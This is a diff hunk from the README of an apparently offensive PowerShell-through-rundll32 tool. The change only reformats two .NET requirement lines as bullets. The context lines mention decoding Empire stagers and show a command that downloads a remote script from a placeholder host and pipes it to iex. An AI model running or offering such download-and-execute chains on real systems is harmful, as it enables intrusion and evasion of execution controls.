@@ -32,8 +32,8 @@ Note: Empire stagers need to be decoded using [System.Text.Encoding]::Unicode
 rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;
 ```
 ## Requirements
-.Net v3.5 for dll mode.
-.Net v2.0 for exe mode.
+ * .Net v3.5 for dll mode.
+ * .Net v2.0 for exe mode.
 
 ## Known Issues
 
